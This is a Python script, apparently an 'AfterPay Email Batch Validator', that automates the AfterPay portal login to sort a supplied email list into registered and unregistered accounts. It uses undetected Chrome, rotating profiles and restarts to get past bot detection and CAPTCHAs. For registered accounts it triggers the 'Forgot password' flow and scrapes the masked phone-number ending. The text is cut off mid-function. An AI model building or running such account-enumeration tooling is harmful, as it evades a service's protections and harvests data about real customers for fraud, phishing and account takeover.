#!/usr/bin/env python3
"""
AfterPay Email Batch Validator
Mode batch processing dengan window size 500x500
Menggunakan list.txt untuk input email dan save ke valid.txt & invalid.txt
"""

import time
import re
import subprocess
import logging
import threading
from queue import Queue
import undetected_chromedriver as uc
import tempfile
try:
    import psutil
    PSUTIL_AVAILABLE = True
except Exception:
    PSUTIL_AVAILABLE = False
import shutil
import os
import sys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException


# Custom exception to represent a browser-detection scenario
class BrowserDetectedException(WebDriverException):
    """Raised when a page shows detection markers and we should rotate the browser/profile."""
    pass

# Helper detection strings that indicate browser was detected / blocked
BOT_DETECTION_MARKERS = [
    'access denied', 'unusual traffic', 'have detected', 'captcha', 'recaptcha', 'blocked',
    'error 403', 'error 429', 'corrupt', 'corrupted', 'connection reset',
    'an unknown error occurred', 'unknown error occurred', 'please try again',
    'no such window', 'web view not found', 'target window already closed',
    'something went wrong', 'temporary issue', 'service unavailable', 'try again later',
    'browser not supported', 'javascript required', 'cookies required',
    'request blocked', 'access restricted', 'verification required'
]

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


def classify_page(final_url: str, page_source: str):
    """Classify the page into valid/invalid/detection.

    Returns: (is_valid: bool, is_invalid: bool, is_detection: bool, reason: str)
    """
    fu = (final_url or '').lower()
    ps = (page_source or '').lower()

    # Check for password page (valid account) - HIGHEST PRIORITY for VALID
    # Logic: If URL contains /password, it is VALID.
    if '/password' in fu:
        return True, False, False, 'url_contains_password'

    if 'input type=\'password\'' in ps or 'input type="password"' in ps or 'name="password"' in ps:
        return True, False, False, 'password_field_found'

    # Common invalid markers - Check these BEFORE detection markers
    # These are explicit messages that mean the account doesn't exist
    invalid_markers = [
        'account not found', "we couldn't find", "couldn't find", 'no account', 
        'not registered', 'no user found', 'email not found', 'invalid email'
    ]
    for im in invalid_markers:
        if im in ps:
            return False, True, False, f"invalid_marker:{im}"

    # Detection markers - BUT exclude "an unknown error occurred" and "please try again" here
    # because those are handled separately and trigger browser restart
    detection_markers_filtered = [m for m in BOT_DETECTION_MARKERS 
                                   if m not in ['an unknown error occurred', 'unknown error occurred', 'please try again']]
    
    for m in detection_markers_filtered:
        if m in fu or m in ps:
            logger.warning(f"🤖 Bot detection marker found: '{m}' - Browser needs restart!")
            return False, False, True, f"detected_marker:{m}"

    # Check for "unknown error" - this should trigger detection/restart
    if 'an unknown error occurred' in ps or 'unknown error occurred' in ps:
        logger.warning(f"🤖 Unknown error detected - Browser needs restart!")
        return False, False, True, "detected_marker:unknown_error"

    # Do not classify 'signin' or 'login' as invalid by default; rely on password field or explicit messages instead

    # Fallback invalid
    return False, True, False, 'fallback_invalid'


def save_email_result(email, status, url=None, phone_ending=None, verification_url=None, display=None):
    """Save email result to appropriate file"""
    try:
        if status == 'valid':
            filename = 'valid.txt'
            # Prefer provided display string (single-line); otherwise build one from phone_ending
            if display:
                message = f"{display}\n"
            else:
                if phone_ending:
                    # Extract digits from phone_ending and format as ***{digits}
                    dig = re.search(r"(\d{1,})", phone_ending or '')
                    if dig:
                        mask = f"***{dig.group(1)}"
                    else:
                        # fallback without digits
                        mask = phone_ending
                    message = f"✅ VALID - {email} |  {mask}\n"
                else:
                    message = f"✅ VALID - {email}\n"
        else:
            filename = 'invalid.txt'
            message = f"❌ INVALID - {email}\n"
            message += "---\n"
        
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(message)
        logger.debug(f"💾 Saved to {filename}: {email}")
        
    except Exception as e:
        logger.error(f"❌ Error saving to file: {e}")


class AfterPayBatchValidator:
    """AfterPay Email Batch Validator with 500x500 window"""
    
    def __init__(self, headless=False, random_profile=False, window_position=None):
        self.driver = None
        self.headless = headless
        self.random_profile = random_profile
        self.profile_dir = None
        self.window_position = window_position
        self.create_driver()
    
    def create_driver(self):
        """Create Chrome driver with 500x500 window"""
        try:
            # Simple Chrome options
            options = uc.ChromeOptions()
            
            # Basic settings for speed
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_argument('--disable-extensions')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--disable-web-security')
            options.add_argument('--allow-running-insecure-content')
            options.add_argument('--disable-features=VizDisplayCompositor')
            options.add_argument('--no-first-run')
            options.add_argument('--no-service-autorun')
            options.add_argument('--password-store=basic')
            
            # macOS specific security bypass
            options.add_argument('--remote-debugging-port=0')
            options.add_argument('--disable-background-timer-throttling')
            options.add_argument('--disable-backgrounding-occluded-windows')
            options.add_argument('--disable-renderer-backgrounding')
            
            # Window size - Set to 500x500
            options.add_argument('--window-size=500,500')
            
            # Set window position if provided
            if self.window_position:
                x, y = self.window_position
                options.add_argument(f'--window-position={x},{y}')
            
            if self.headless:
                options.add_argument('--headless=new')

            # If requested, create a temporary user-data-dir (random Chrome profile)
            if self.random_profile:
                try:
                    self.profile_dir = tempfile.mkdtemp(prefix="ap_profile_")
                    options.add_argument(f"--user-data-dir={self.profile_dir}")
                    logger.debug(f"🔐 Using random profile dir: {self.profile_dir}")
                except Exception as e:
                    logger.warning(f"⚠️ Could not create random profile dir: {e}")
            
            # Try to use system Chrome first
            import os
            chrome_paths = [
                "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
                "/Applications/Chromium.app/Contents/MacOS/Chromium",
            ]
            
            chrome_binary = None
            for path in chrome_paths:
                if os.path.exists(path):
                    chrome_binary = path
                    logger.debug(f"🔍 Found system Chrome: {path}")
                    break
            
            if chrome_binary:
                options.binary_location = chrome_binary
            
            # Create driver with fallback methods
            try:
                # Method 1: Normal undetected chrome
                self.driver = uc.Chrome(options=options, version_main=None)
                logger.debug("✅ Chrome driver created (Method 1)")
                try:
                    svc = getattr(self.driver, 'service', None)
                    proc = getattr(svc, 'process', None) if svc else None
                    if proc and getattr(proc, 'pid', None):
                        logger.debug(f"🔎 Driver PID: {proc.pid}")
                except Exception:
                    pass
            except Exception as e1:
                logger.exception(f"Method 1 failed: {e1}")
                try:
                    # Method 2: With use_subprocess=False
                    self.driver = uc.Chrome(options=options, version_main=None, use_subprocess=False)
                    logger.debug("✅ Chrome driver created (Method 2)")
                except Exception as e2:
                    logger.exception(f"Method 2 failed: {e2}")
                    # Method 3: Regular selenium as fallback
                    from selenium import webdriver
                    regular_options = webdriver.ChromeOptions()
                    regular_options.add_argument('--disable-blink-features=AutomationControlled')
                    regular_options.add_argument('--no-sandbox')
                    regular_options.add_argument('--disable-dev-shm-usage')
                    regular_options.add_argument('--window-size=500,500')
                    if chrome_binary:
                        regular_options.binary_location = chrome_binary
                    self.driver = webdriver.Chrome(options=regular_options)
                    logger.debug("✅ Chrome driver created (Fallback)")
            
            # Small delay after creation
            time.sleep(0.5)
            
            # Ensure we have a valid window handle before proceeding
            # Retry a few times if window is not immediately available
            for _ in range(5):
                try:
                    if self.driver.window_handles:
                        break
                except Exception:
                    pass
                time.sleep(0.2)

            try:
                if not self.driver.window_handles:
                    logger.debug("⚠️ No window handles found, attempting to create one...")
                    self.driver.execute_script("window.open('');")
                    time.sleep(0.5)
            except Exception:
                pass

            # Set timeouts to prevent hanging - Increased for slow connections
            try:
                self.driver.set_page_load_timeout(90)
                self.driver.set_script_timeout(90)
            except Exception:
                pass

            # Set window size explicitly after creation with retry
            for _ in range(3):
                try:
                    self.driver.set_window_size(500, 500)
                    if self.window_position:
                        x, y = self.window_position
                        self.driver.set_window_position(x, y)
                        logger.debug(f"🖥️ Window position set to {x},{y}")
                    logger.debug("🖥️ Window size set to 500x500")
                    break
                except Exception as e:
                    msg = str(e).lower()
                    if 'no such window' in msg or 'web view not found' in msg:
                        logger.warning(f"⚠️ Window not ready yet, retrying resize... ({e})")
                        time.sleep(0.5)
                        # Try to switch to the first window if possible
                        try:
                            if self.driver.window_handles:
                                self.driver.switch_to.window(self.driver.window_handles[0])
                        except Exception:
                            pass
                    else:
                        logger.warning(f"Could not set window size: {e}")
                        break
            
            # REMOVED: Redundant wait_until_ready call here. 
            # The worker thread calls wait_until_ready immediately after creation.
            # This speeds up the 'creation' phase and lets the worker handle readiness timeouts.
            
            # Verify driver has at least one window handle; if none, fail fast for recreate
            try:
                wh = []
                try:
                    wh = self.driver.window_handles
                except Exception as e:
                    logger.warning(f"⚠️ Error reading window handles: {e}")
                    wh = []
                if not wh:
                    logger.exception("❌ Driver created but no window handles present; treating as not ready")
                    try:
                        self.driver.quit()
                    except Exception:
                        pass
                    raise WebDriverException("No window handles; driver closed or not ready")
                # Also verify the underlying process is alive if psutil is available
                try:
                    svc = getattr(self.driver, 'service', None)
                    proc = getattr(svc, 'process', None) if svc else None
                    pid = getattr(proc, 'pid', None) if proc else None
                    if pid and PSUTIL_AVAILABLE:
                        try:
                            p = psutil.Process(pid)
                            if not p.is_running():
                                logger.error(f"❌ Driver process PID {pid} is not running; recreating")
                                try:
                                    self.driver.quit()
                                except Exception:
                                    pass
                                raise WebDriverException("Driver process not alive")
                        except Exception:
                            # If psutil says process doesn't exist, treat as not ready
                            logger.error(f"❌ Could not verify driver pid {pid}; treating as not ready")
                            try:
                                self.driver.quit()
                            except Exception:
                                pass
                            raise WebDriverException("Driver process not alive")
                except Exception:
                    pass
            except Exception:
                raise
            
        except Exception as e:
            logger.exception(f"❌ Error creating driver: {e}")
            raise
    
    def validate_email(self, email, timeout=60):
        """Validate single email"""
        # No try/except block here, let exceptions bubble up to browser_worker
        logger.debug(f"🔍 Testing: {email}")
        
        # Go to AfterPay portal
        logger.debug("🌐 Opening AfterPay portal...")
        self.driver.get("https://portal.afterpay.com/en-US")
        
        # Wait for and find email input
        email_input = WebDriverWait(self.driver, 60).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='email'], input[name='email']"))
        )
        logger.debug("📧 Found email input")
        
        # Wait a bit for page to fully load
        time.sleep(2)
        
        # Clear and type email
        email_input.clear()
        for char in email:
            email_input.send_keys(char)
            time.sleep(0.02)
        
        logger.debug(f"⌨️ Typed: {email}")
        
        # Find and click continue button
        continue_button = WebDriverWait(self.driver, 30).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']"))
        )
        logger.debug("🔘 Found button")
        
        # Capture initial URL to detect redirection
        initial_url = self.driver.current_url
        
        continue_button.click()
        logger.debug("👆 Clicked Continue")
        
        # IMPORTANT: Give page time to process the request before checking for errors
        # This prevents false positives from transient loading states
        logger.debug("⏳ Waiting for page to process (2s grace period)...")
        time.sleep(2.0)  # Grace period to let page start processing
        
        # Wait for page transition (Valid -> Redirect, Invalid -> Error msg)
        # Max wait 60 seconds total, checking every 0.2s (less aggressive)
        early_invalid_marker = None
        unknown_error_detected = False
        unknown_error_count = 0  # Count how many times we see the error (must be persistent)
        
        logger.debug("🔍 Starting page transition monitoring...")
        
        for iteration in range(300):  # 300 * 0.2s = 60 seconds max
            time.sleep(0.2)
            try:
                curr_url = self.driver.current_url
                # Check if URL changed
                if curr_url != initial_url:
                    logger.debug(f"🔄 URL changed: {initial_url} -> {curr_url}")
                    break # Found URL change, stop waiting
                
                src = self.driver.page_source.lower()
                
                # 2. Check for invalid markers FIRST (these are definitive and should not trigger restart)
                if "account not found" in src:
                    early_invalid_marker = "account not found"
                    logger.debug("❌ Found 'account not found' marker")
                    break
                if "couldn't find" in src or "we couldn't find" in src:
                    early_invalid_marker = "couldn't find"
                    logger.debug("❌ Found 'couldn't find' marker")
                    break
                
                # 1. Check for restart trigger (Unknown error) - BUT ONLY after initial grace period
                # AND it must appear MULTIPLE times to avoid false positives
                if iteration >= 10:  # Only start checking after 2+ seconds (10 * 0.2s)
                    if "an unknown error occurred" in src or "unknown error occurred" in src:
                        unknown_error_count += 1
                        if unknown_error_count >= 3:  # Must see error 3 times in a row (0.6s persistent)
                            logger.warning("⚠️ Persistent 'An unknown error occurred' detected. Triggering restart...")
                            unknown_error_detected = True
                            raise BrowserDetectedException("An unknown error occurred. Please try again (restart browser)")
                    else:
                        # Reset counter if error disappears (it was transient)
                        if unknown_error_count > 0:
                            logger.debug(f"ℹ️ Unknown error cleared (was seen {unknown_error_count} times)")
                        unknown_error_count = 0

            except BrowserDetectedException:
                raise
            except Exception:
                pass

        # First try to detect presence of a password field using DOM elements (reliable indicator of valid account)
        password_present = False
        if not early_invalid_marker:
            try:
                pw_elem = WebDriverWait(self.driver, 20).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='password'], input[name='password']"))
                )
                if pw_elem:
                    password_present = True
            except TimeoutException:
                password_present = False
        
        # Check final URL (this is the validated page URL)
        final_url = self.driver.current_url
        validated_page = final_url
        logger.debug(f"🌐 Final URL: {final_url}")

        # Also check page content for bot detection/corruption and classify result
        page_source = ''
        try:
            page_source = self.driver.page_source
        except Exception:
            pass

        # Check specifically for "An unknown error occurred. Please try again."
        # This indicates the browser needs restart, but ONLY if:
        # 1. We didn't already detect it during polling (avoid duplicate detection)
        # 2. We don't have an explicit invalid marker (account not found takes precedence)
        # 3. The URL hasn't changed (if redirected to password page, ignore any transient errors)
        if not early_invalid_marker and not unknown_error_detected and not password_present:
            ps_lower = page_source.lower()
            if "an unknown error occurred" in ps_lower or "unknown error occurred" in ps_lower:
                # Only trigger restart if BOTH conditions: error message + still on same page
                if "please try again" in ps_lower and final_url == initial_url:
                    logger.warning("⚠️ Final check: Detected persistent 'An unknown error occurred'. Triggering browser restart...")
                    raise BrowserDetectedException("An unknown error occurred. Please try again (restart browser)")

        # Use DOM detection first; classify as valid if password input present
        if password_present:
            is_valid, is_invalid, is_detection, reason = True, False, False, 'password_field'
        elif early_invalid_marker:
            # We found an invalid marker during the polling loop
            is_valid, is_invalid, is_detection, reason = False, True, False, f'invalid_marker:{early_invalid_marker}'
        else:
            is_valid, is_invalid, is_detection, reason = classify_page(final_url, page_source)
            
            # Override: If URL changed and no explicit invalid/detection found, mark as valid
            # Even if classify_page returned fallback_invalid, if URL changed, it's valid.
            is_explicitly_invalid = is_invalid and reason.startswith('invalid_marker')
            if not is_detection and not is_explicitly_invalid and final_url != initial_url:
                is_valid = True
                is_invalid = False
                reason = 'url_changed_redirect'
            
            logger.debug(f"🔎 Classification: valid={is_valid} invalid={is_invalid} detect={is_detection} reason={reason}")

            # If ambiguous fallback invalid AND URL didn't change, give it one quick retry to avoid false negatives
            if is_invalid and reason == 'fallback_invalid' and final_url == initial_url:
                logger.debug(f"⚠️ Ambiguous result for {email}, re-checking once before marking invalid...")
                time.sleep(1.5)
                final_url = self.driver.current_url
                try:
                    page_source = self.driver.page_source
                except Exception:
                    page_source = ''
                is_valid2, is_invalid2, is_detection2, reason2 = classify_page(final_url, page_source)
                logger.debug(f"🔁 Re-check classification: valid={is_valid2} invalid={is_invalid2} detect={is_detection2} reason={reason2}")
                # keep detection if seen
                if is_detection2:
                    raise BrowserDetectedException(f"Browser detected/blocked due to: {reason2}")
                is_valid, is_invalid, is_detection, reason = is_valid2, is_invalid2, is_detection2, reason2
        
        # If detection found, raise exception to trigger browser restart
        if is_detection:
            logger.error(f"❗ Browser blocked/detected (reason={reason}) for {email}")
            # Raise our custom exception so caller can distinguish detection vs other webdriver errors
            raise BrowserDetectedException(f"Browser detected/blocked due to: {reason}")
        
        # Determine if valid/invalid
        # We already used classify_page; use its results
        
        phone_ending = None
        verification_page = None
        if is_valid:
            logger.info(f"✅ VALID: {email}")
            # Try to click "Forgot password?" and record the masked phone number on the verification page
            try:
                # Only attempt this if we're on the password page or password field exists
                if '/password' in (final_url or '').lower() or password_present:
                    forgot_elem = None
                    try:
                        forgot_elem = self.driver.find_element(By.XPATH, "//a[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'forgot')]")
                    except Exception:
                        try:
                            forgot_elem = self.driver.find_element(By.XPATH, "//button[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'forgot')]")
                        except Exception:
                            forgot_elem = None
                    if forgot_elem:
                        try:
                            logger.debug("🔗 Clicking 'Forgot password?' link to reach verification page...")
                            forgot_elem.click()
                            # Wait for verification page or the text 'ending in' to appear
                            WebDriverWait(self.driver, 10).until(lambda d: '/create-password-verify' in (d.current_url or '').lower() or 'ending in' in (d.page_source or '').lower())
                            # Update final_url & verification_page
                            # Update verification_page; keep validated_page as the original password page
                            verification_page = self.driver.current_url
                            # NOTE: Removed logging of the full verification page URL for privacy/verbosity
                            # Attempt to find the masked phone number
                            try:
                                el = WebDriverWait(self.driver, 7).until(
                                    EC.presence_of_element_located((By.XPATH, "//*[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'ending in') or contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'ending with')]") )
                                )
                                txt = el.text.strip() if el and hasattr(el, 'text') else ''
                                # Extract masked part like '••• 05' or last digits if masked not present
                                m = re.search(r'ending in\s*([•\*x\s\d]+)', txt, flags=re.I)
                                if m:
                                    phone_ending = m.group(1).strip()
                                    logger.info(f"📱 Phone ending found: {phone_ending}")
                                else:
                                    # fallback to capture last digit group
                                    dig = re.search(r'(\d{2,4})', txt)
                                    if dig:
                                        phone_ending = f"••• {dig.group(1)}"
                            except TimeoutException:
                                # fallback - attempt to parse from page source
                                try:
                                    ps = (self.driver.page_source or '').lower()
                                    m2 = re.search(r'ending in\s*([•\*x\s\d]+)', ps, flags=re.I)
                                    if m2:
                                        phone_ending = m2.group(1).strip()
                                    else:
                                        d2 = re.search(r'(\d{2,4})', ps)
                                        if d2:
                                            phone_ending = f"••• {d2.group(1)}"
                                            logger.info(f"📱 Phone ending found (fallback digits): {phone_ending}")
                                except Exception:
                                    pass
                        except Exception as e:
                            logger.debug(f"🔍 Could not click 'Forgot password?' or fetch verification info: {e}")
            except Exception as e:
                logger.debug(f"🔍 Error during 'Forgot password?' handling: {e}")
        else:
            logger.info(f"❌ INVALID: {email}")
        
        # Small delay to allow visual confirmation if user is watching
        time.sleep(1.0)
        
        # Compute display string for GUI/file output
        display = None
        try:
            if is_valid:
                if phone_ending:
                    digits = re.search(r"(\d{1,})", phone_ending or '')
                    mask = f"***{digits.group(1)}" if digits else phone_ending
                    display = f"✅ VALID - {email} |  {mask}"
                else:
                    display = f"✅ VALID - {email}"
            else:
                display = f"❌ INVALID - {email}"
        except Exception:
            display = f"✅ VALID - {email}" if is_valid else f"❌ INVALID - {email}"

        return {
            'email': email,
            'valid': is_valid,
            'final_url': validated_page,
            'validation_page': validated_page,
            'verification_page': verification_page,
            'phone_ending': phone_ending,
            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
            'display': display
        }
    
    def close(self):
        """Close browser"""
        try:
            if self.driver:
                try:
                    # Try to gracefully close, prefer driver.close() then quit()
                    try:
                        if hasattr(self.driver, 'close'):
                            try:
                                self.driver.close()
                            except Exception:
                                pass
                        self.driver.quit()
                        logger.debug("🚪 Browser closed (quit called)")
                    except Exception as inner_e:
                        # Some drivers (mock) may not have quit/close; ignore and continue to force kill
                        logger.warning(f"⚠️ Error calling driver.close()/quit(): {inner_e}")
                except Exception as e:
                    logger.warning(f"⚠️ Error calling driver.quit(): {e}")
                # (Deprecated older termination block removed)
                # Ensure process killed if still running - Windows compatible
                try:
                    svc = getattr(self.driver, 'service', None)
                    proc = getattr(svc, 'process', None) if svc else None
                    pid = getattr(proc, 'pid', None) if proc else None
                    if pid:
                        # Windows-compatible process termination
                        if PSUTIL_AVAILABLE:
                            try:
                                p = psutil.Process(pid)
                                # Kill all children first
                                children = p.children(recursive=True)
                                for c in children:
                                    try:
                                        c.kill()
                                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                                        pass
                                # Wait for children to terminate
                                gone, alive = psutil.wait_procs(children, timeout=1)
                                # Kill parent process
                                try:
                                    p.kill()
                                    p.wait(timeout=2)
                                    logger.debug(f"🧹 Killed driver process PID {pid} (via psutil)")
                                except (psutil.NoSuchProcess, psutil.AccessDenied):
                                    pass
                            except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
                                logger.debug(f"Process {pid} already terminated or access denied: {e}")
                            except Exception as e:
                                logger.warning(f"⚠️ Error killing process {pid} with psutil: {e}")
                        else:
                            # Fallback without psutil - use subprocess.Popen.kill()
                            try:
                                if hasattr(proc, 'kill') and callable(proc.kill):
                                    proc.kill()
                                    logger.debug(f"🧹 Killed driver process PID {pid} (via proc.kill)")
                            except Exception as e:
                                logger.warning(f"⚠️ Could not kill process PID {pid}: {e}")
                except Exception as e:
                    logger.warning(f"⚠️ Error during process cleanup: {e}")
            # Clean up temporary profile dir if it was created
            if getattr(self, 'profile_dir', None):
                try:
                    shutil.rmtree(self.profile_dir, ignore_errors=True)
                    logger.debug(f"🧹 Removed temporary profile dir: {self.profile_dir}")
                except Exception as e:
                    logger.warning(f"⚠️ Could not remove profile dir {self.profile_dir}: {e}")
                finally:
                    self.profile_dir = None
        except Exception as e:
            logger.error(f"Error closing browser: {e}")

    def wait_until_ready(self, check_url: str = "https://portal.afterpay.com/en-US", timeout: int = 20) -> bool:
        """Attempt to ensure driver is responsive.
        
        We perform a simple liveness check instead of loading the full portal to speed up startup.
        """
        if not self.driver:
            return False
        start = time.time()
        try:
            # Keep trying until timeout
            while time.time() - start < timeout:
                try:
                    # Simple liveness check: can we get the title or current_url?
                    # Also catch NoSuchWindowException specifically
                    _ = self.driver.title
                    logger.debug("✅ Browser ready (liveness check passed)")
                    return True
                except Exception as inner_e:
                    msg = str(inner_e).lower()
                    if 'no such window' in msg or 'target window already closed' in msg:
                        logger.debug(f"⚠️ Window closed during readiness check, trying to switch/reopen... ({inner_e})")
                        try:
                            if self.driver.window_handles:
                                self.driver.switch_to.window(self.driver.window_handles[0])
                                continue
                        except Exception:
                            pass
                    logger.debug(f"Waiting for browser readiness: {inner_e}")
                    time.sleep(0.5)
            return False
        except Exception as e:
            logger.warning(f"⚠️ Browser readiness check failed: {e}")
            return False

class AfterPayBatchProcessor:
    """Batch processor for multiple emails"""
    
    def __init__(self, num_browsers=3, headless=False, progress_callback=None, summary_callback=None, stop_event=None, restart_callback=None, ready_callback=None, driver_startup_attempts: int = 12, driver_startup_timeout: int = 20, stagger_between_browsers: float = 1.2):
        self.num_browsers = num_browsers
        self.headless = headless
        self.email_queue = Queue()
        self.results = []
        self.results_lock = threading.Lock()
        self.progress_callback = progress_callback
        self.summary_callback = summary_callback
        self.processing_callback = None
        self._stop_event = stop_event or threading.Event()
        self._pause_event = threading.Event()
        self.restart_callback = restart_callback
        self.ready_callback = ready_callback
        # Startup attempts/timeouts configurable
        self.driver_startup_attempts = driver_startup_attempts
        self.driver_startup_timeout = driver_startup_timeout
        self.stagger_between_browsers = stagger_between_browsers
        # Track PIDs for created driver processes by browser id
        self.browser_pids = {}
        # Lock for pid registry
        self._pid_lock = threading.Lock()

    def _register_pid(self, browser_id: int, pid: int):
        try:
            with self._pid_lock:
                self.browser_pids[browser_id] = pid
        except Exception:
            pass

    def _unregister_pid(self, browser_id: int):
        try:
            with self._pid_lock:
                self.browser_pids.pop(browser_id, None)
        except Exception:
            pass

    def _kill_pid(self, pid: int):
        """Kill a process by PID - Windows compatible"""
        try:
            if PSUTIL_AVAILABLE:
                try:
                    p = psutil.Process(pid)
                    for c in p.children(recursive=True):
                        try:
                            c.kill()
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            pass
                    p.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            else:
                # Windows fallback using taskkill
                if sys.platform == 'win32':
                    try:
                        subprocess.run(['taskkill', '/F', '/PID', str(pid), '/T'], 
                                     capture_output=True, timeout=5)
                    except Exception:
                        pass
        except Exception:
            pass

    def cleanup_orphan_drivers(self):
        """Kill old undetected_chromedriver processes that are not tracked by this processor.

        This targets processes that include 'ap_profile_' or 'undetected_chromedriver' in their commandline.
        """
        if not PSUTIL_AVAILABLE:
            logger.debug("psutil not available - skipping orphan driver cleanup")
            return
        
        logger.debug("🧹 Cleaning up orphan drivers...")
        start_cleanup = time.time()
        my_pid = os.getpid()
        
        try:
            current_pids = set()
            with self._pid_lock:
                for v in self.browser_pids.values():
                    if v:
                        current_pids.add(v)
            
            # Use a faster iteration if possible, and limit time
            for p in psutil.process_iter(['pid', 'cmdline', 'create_time']):
                # Safety timeout - don't spend more than 5 seconds cleaning up
                if time.time() - start_cleanup > 5:
                    logger.warning("⚠️ Orphan cleanup timed out, skipping remaining checks")
                    break
                    
                try:
                    pid = p.info.get('pid')
                    if pid == my_pid:
                        continue
                        
                    cmdline = ' '.join(p.info.get('cmdline') or [])
                    if not cmdline:
                        continue
                    
                    # Check for our specific markers
                    if ('ap_profile_' in cmdline or 'undetected_chromedriver' in cmdline or 'undetect' in cmdline) and pid not in current_pids:
                        try:
                            logger.debug(f"🧹 Killing orphan driver PID {pid}")
                            p.kill()
                        except Exception:
                            pass
                except Exception:
                    pass
        except Exception as e:
            logger.warning(f"⚠️ Error during orphan cleanup: {e}")
        
    def load_emails_from_file(self, filename='list.txt'):
        """Load emails from file"""
        emails = []
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                for line in f:
                    email = line.strip()
                    if email and '@' in email:
                        emails.append(email)
            
            logger.info(f"📋 Loaded {len(emails)} emails from {filename}")
            return emails
            
        except FileNotFoundError:
            logger.error(f"❌ File {filename} not found!")
            return []
        except Exception as e:
            logger.error(f"❌ Error loading emails: {e}")
            return []
    
    def browser_worker(self, browser_id, window_position=None):
        """Worker thread for processing emails"""
        logger.debug(f"🚀 Browser {browser_id} starting...")
        
        try:
            # Create validator for this browser; if creation or readiness fails, keep retrying
            max_startup_attempts = self.driver_startup_attempts
            while not self._stop_event.is_set():
                # If paused before starting, wait until resumed
                while self._pause_event.is_set() and not self._stop_event.is_set():
                    time.sleep(0.2)

                validator = None
                for attempt in range(1, max_startup_attempts + 1):
                    try:
                        logger.debug(f"🔧 Browser {browser_id} startup attempt {attempt}/{max_startup_attempts}")
                        # Use random profile after the 1st attempt to minimize re-detection
                        validator = AfterPayBatchValidator(headless=self.headless, random_profile=(attempt > 1), window_position=window_position)
                        if validator and validator.wait_until_ready(timeout=self.driver_startup_timeout):
                            logger.debug(f"✅ Validator for browser {browser_id} confirmed ready (attempt {attempt})")
                            # Register pid and notify readiness
                            try:
                                svc = getattr(validator, 'service', None)
                                proc = getattr(svc, 'process', None) if svc else None
                                pid = getattr(proc, 'pid', None) if proc else None
                                if pid:
                                    with self._pid_lock:
                                        self.browser_pids[browser_id] = pid
                                    logger.debug(f"🔎 Registered Browser {browser_id} PID: {pid}")
                                if callable(self.ready_callback):
                                    try:
                                        self.ready_callback(browser_id, pid)
                                    except Exception:
                                        pass
                            except Exception:
                                pass
                            break
                        else:
                            logger.warning(f"⚠️ Validator for browser {browser_id} not ready (attempt {attempt})")
                            try:
                                if validator:
                                    validator.close()
                            except Exception:
                                pass
                            validator = None
                    except Exception as e1:
                        logger.exception(f"⚠️ Could not create validator (attempt {attempt}): {e1}")
                        try:
                            if validator:
                                validator.close()
                        except Exception:
                            pass
                        validator = None
                    finally:
                        # small backoff before next attempt
                        time.sleep(min(0.5 * attempt, 5))

                if not validator:
                    logger.error(f"❌ Could not create a ready validator for browser {browser_id} after {max_startup_attempts} attempts; sleeping and retrying...")
                    # Inform GUI via restart callback (so it can show a warning)
                    try:
                        if callable(self.restart_callback):
                            self.restart_callback(browser_id, 0, f"create_failed: could not create validator after {max_startup_attempts} attempts", None)
                    except Exception:
                        pass
                    time.sleep(5)
                    continue
                # We've got a ready validator; break startup loop to process emails
                break
            
            while not self.email_queue.empty() and not self._stop_event.is_set():
                # Ensure validator exists; if it's None (previous close failed), try creating again
                if validator is None:
                    try:
                        validator = AfterPayBatchValidator(headless=self.headless, window_position=window_position)
                        logger.debug(f"🔁 Recreated validator for browser {browser_id}")
                    except Exception as e:
                        logger.exception(f"⚠️ Could not recreate validator for browser {browser_id}: {e}")
                        # Notify GUI that creation failed for this browser
                        try:
                            if callable(self.restart_callback):
                                self.restart_callback(browser_id, 0, f"create_failed: could not recreate validator: {e}", None)
                        except Exception:
                            pass
                        time.sleep(0.5)
                        continue
                # Pause functionality: if pause is requested, block here until resumed or stopped
                while self._pause_event.is_set() and not self._stop_event.is_set():
                    time.sleep(0.2)
                try:
                    email = self.email_queue.get(timeout=1)
                except Exception:
                    # queue empty or timeout; loop again
                    continue

                try:
                    logger.debug(f"🌐 Browser {browser_id} processing: {email}")

                    # Break early if a stop was requested
                    if self._stop_event.is_set():
                        break

                    # Make sure validator is still available and ready; recreate if needed
                    if validator is None:
                        try:
                            validator = AfterPayBatchValidator(headless=self.headless, random_profile=True, window_position=window_position)
                            if not validator.wait_until_ready(timeout=self.driver_startup_timeout):
                                logger.warning(f"⚠️ Newly-created validator for browser {browser_id} not ready; continuing")
                                validator.close()
                                validator = None
                                continue
                        except Exception as e:
                            logger.warning(f"⚠️ Could not create validator for browser {browser_id}: {e}")
                            validator = None
                            continue

                    # Notify UI/consumer that the email processing is starting NOW the validator is ready
                    try:
                        if self.processing_callback:
                            try:
                                self.processing_callback(email, browser_id)
                            except Exception:
                                pass
                    except Exception:
                        pass

                    # Attempt to validate with retries on webdriver errors
                    attempts = 0
                    max_retries = 2
                    result = None
                    requeued = False
                    while attempts <= max_retries:
                        try:
                            result = validator.validate_email(email)
                            break
                        except BrowserDetectedException as bde:
                            # Explicit browser-detected error: IMMEDIATE restart with fresh profile
